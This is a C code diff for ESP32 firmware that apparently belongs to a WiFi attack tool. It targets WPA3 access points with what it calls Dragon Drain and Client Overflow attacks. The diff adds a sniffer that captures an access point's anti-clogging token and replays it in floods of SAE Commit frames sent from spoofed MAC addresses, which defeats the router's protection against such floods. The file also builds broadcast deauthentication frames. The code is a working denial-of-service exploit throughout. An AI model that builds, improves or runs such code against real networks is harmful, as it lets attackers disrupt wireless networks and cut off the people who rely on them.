@@ -37,7 +37,7 @@ uint8_t deauth_frame_default[] = {
     0xC0, 0x00,                         // Type/Subtype: Deauthentication (0xC0)
     0x00, 0x00,                         // Duration
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Nadawca (BSSID AP)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender (BSSID AP)
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
     0x00, 0x00,                         // Seq Control
     0x01, 0x00                          // Reason: Unspecified (0x0001)
@@ -60,7 +60,9 @@ static mbedtls_entropy_context entropy;
 
 /* Router BSSID */
 static uint8_t bssid[6] = { 0x30, 0xAA, 0xE4, 0x3C, 0x3F, 0x68};
- 
+
+char * anti_clogging_token = NULL; // Anti-Clogging Token, if any
+int actLength = 0; // Length of the Anti-Clogging Token
 
 /* Spoofing base address. Each frame modifies last byte of the address to create a unique source address.*/
 static const uint8_t base_srcaddr[6] = { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x71 };
@@ -70,7 +72,7 @@ static int next_src = 0;        // spoofing index
 
 #define NUM_MAC_POOL 20
 
-// Stała tablica 20 MAC adresów – każdy wpis ma stały prefiks i rosnący ostatni bajt
+// Pool of MAC addresses for Dragon Drain attack.
 static const uint8_t mac_pool[NUM_MAC_POOL][6] = {
     { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x71 },
     { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x72 },
@@ -173,26 +175,94 @@ static void update_spoofed_src_random(void) {
     next_src = (next_src + 1) % NUM_CLIENTS;
 }
 
+
+
+static void parse_sae_commit(const wifi_promiscuous_pkt_t *pkt) {
+    const uint8_t *buf = pkt->payload;
+    int len = pkt->rx_ctrl.sig_len;
+
+    // Ignore retransmission:
+    if (buf[1] & 0x08) return;
+
+
+    int tods_fromds = buf[1] & 0x03;
+    int pos_bssid = 0, pos_src = 0, pos_dst = 0;
+
+    switch (tods_fromds) {
+        case 0:
+            pos_bssid = 16; pos_src = 10; pos_dst = 4; break;
+        case 1:
+            pos_bssid = 4;  pos_src = 10; pos_dst = 16; break;
+        case 2:
+            pos_bssid = 10; pos_src = 16; pos_dst = 4; break;
+        default:
+            pos_bssid = 10; pos_src = 24; pos_dst = 16; break;
+    }
+
+    // Check if the frame is addressed to the target BSSID
+    if (memcmp(buf + pos_bssid, bssid, 6) != 0 ||
+        memcmp(buf + pos_src, bssid, 6) != 0)
+        return;
+
+    // Beacon detection 
+    if (buf[0] == 0x80) {
+        ESP_LOGI(TAG, "Wykryto beacon od AP");
+        return;
+    }
+
+    // Searching for SAE Commit
+    if (len > 32 && buf[0] == 0xB0 && buf[24] == 0x03 && buf[26] == 0x01) {
+        if (buf[28] == 0x4C) {
+            const uint8_t *token = buf + 32;
+            int token_len = len - 32;
+
+            if (anti_clogging_token) free(anti_clogging_token);
+            anti_clogging_token = malloc(token_len);
+            if (!anti_clogging_token) {
+                ESP_LOGE(TAG, "Mem error: Unable to allocate memory for anti_clogging_token");
+                actLength = 0;
+                return;
+            }
+
+            memcpy(anti_clogging_token, token, token_len);
+            actLength = token_len;
+
+            char token_str[token_len * 3 + 1];
+            for (int i = 0; i < token_len; i++)
+                sprintf(&token_str[i * 3], "%02X ", token[i]);
+            token_str[token_len * 3] = '\0';
+
+            //ESP_LOGI(TAG, "  Token: %s", token_str);
+        } else if (buf[28] == 0x00) {
+            //ESP_LOGI(TAG, "SAE Commit without ACT");
+        }
+    }
+}
+
+void wifi_sniffer_callback_v1(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type == WIFI_PKT_MGMT) {
+        parse_sae_commit((const wifi_promiscuous_pkt_t *)buf);
+    }
+}
+
+
+
+
 /*
 Injects SAE Commit frame with spoofed source address.
 This function generates a random scalar, computes the corresponding ECC point,
 and constructs the SAE Commit frame with the spoofed source address.
  */
+
 void inject_sae_commit_frame(int randomMac) {
-    uint8_t buf[128];
+    uint8_t buf[256];  
     memset(buf, 0, sizeof(buf));
     memcpy(buf, auth_req_sae_commit_header, AUTH_REQ_SAE_COMMIT_HEADER_SIZE);
     memcpy(buf + 4, bssid, 6);
-
-    /*ESP_LOGI(TAG, "Spoofed_src: %02X:%02X:%02X:%02X:%02X:%02X",
-     spoofed_src[0], spoofed_src[1], spoofed_src[2],
-     spoofed_src[3], spoofed_src[4], spoofed_src[5]);*/
-
-
     memcpy(buf + 10, spoofed_src, 6);
     memcpy(buf + 16, bssid, 6);
 
-    buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = 19;
+    buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = 19;  // Placeholder: scalar size
 
     uint8_t *pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;
     int ret;
@@ -222,42 +292,36 @@ void inject_sae_commit_frame(int randomMac) {
 
     uint8_t point_buf[65];
     size_t point_len = 0;
-    ret = mbedtls_ecp_point_write_binary(&ecc_group, &ecc_element, MBEDTLS_ECP_PF_UNCOMPRESSED,
-                                         &point_len, point_buf, sizeof(point_buf));
+    ret = mbedtls_ecp_point_write_binary(&ecc_group, &ecc_element, MBEDTLS_ECP_PF_UNCOMPRESSED, &point_len, point_buf, sizeof(point_buf));
     if (ret != 0 || point_len != 65) {
         ESP_LOGE(TAG, "mbedtls_ecp_point_write_binary failed: %d", ret);
         return;
     }
 
-    // Byte 0x04 (prefix) + X || Y
-    memcpy(pos, point_buf + 1, 64); // skip 0x04 prefix
+    memcpy(pos, point_buf + 1, 64);  // skip 0x04 prefix
     pos += 64;
 
-    // Select the right method depending on the attack type
-    // For Dragon Drain attack, use the MAC address pool
-    // For Client Overflow attack, use random MAC address
-    if (randomMac) {
-        update_spoofed_src_random();
-    } else {
-        update_spoofed_src();
+    // Append token:
+    if (actLength > 0 && anti_clogging_token != NULL) {
+        *pos++ = 0x4C;           // EID
+        *pos++ = actLength;      // Length
+
+        memcpy(pos, anti_clogging_token, actLength);
+        pos += actLength;
     }
 
+    // Refresh MAC
+    if (randomMac) update_spoofed_src_random();
+    else update_spoofed_src();
 
     size_t total_len = pos - buf;
-
-    //ESP_LOGI(TAG, "Sending SAE frame, length: %d bytes", total_len);
-    //ESP_LOG_BUFFER_HEX(TAG, buf, total_len);
 
     esp_err_t ret_tx = esp_wifi_80211_tx(WIFI_IF_STA, buf, total_len, false);
     if (ret_tx != ESP_OK) {
         ESP_LOGE(TAG, "esp_wifi_80211_tx failed: %s", esp_err_to_name(ret_tx));
-    } else {
-        //ESP_LOGI(TAG, "SAE Commit sent");
     }
 
-    if (frame_count == 0) {
-        start_time = esp_timer_get_time(); 
-    }
+    if (frame_count == 0) start_time = esp_timer_get_time();
     frame_count++;
 
     if (frame_count >= 100) {
@@ -268,13 +332,11 @@ void inject_sae_commit_frame(int randomMac) {
         framesPerSecond = (int)fps;
         frame_count = 0;
         if (framesPerSecond == 0) {
-            vTaskDelay(pdMS_TO_TICKS(50));//give display a chance to pick up changes - just once
+            vTaskDelay(pdMS_TO_TICKS(50));
         }
-        //ESP_LOGI("MEM", "Free heap: %d bytes", esp_get_free_heap_size());
-        //ESP_LOGI("MEM", "Free 8-bit heap: %d bytes", heap_caps_get_free_size(MALLOC_CAP_8BIT));
     }
-
 }
+
 
 void prepareAttack(const wifi_ap_record_t ap_record) {
     globalDataCount = 1;
@@ -286,6 +348,11 @@ void prepareAttack(const wifi_ap_record_t ap_record) {
         ESP_LOGE(TAG, "Crypto initialization failed");
         return;
     }
+
+    //Enable promiscuous mode in order to listen to SAE Commit frames
+    ESP_LOGI(TAG, "Enabling promiscuous mode for SAE Commit frames");
+    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_callback_v1);
+    esp_wifi_set_promiscuous(true);
 
 }
 
@@ -366,7 +433,7 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
         wifictl_set_channel(ap_record->primary);
 
         if (counter == 0) {
-            start_time = esp_timer_get_time(); // Pobranie aktualnego czasu w µs
+            start_time = esp_timer_get_time(); 
         }
 
         uint8_t deauth_frame[sizeof(deauth_frame_default)];
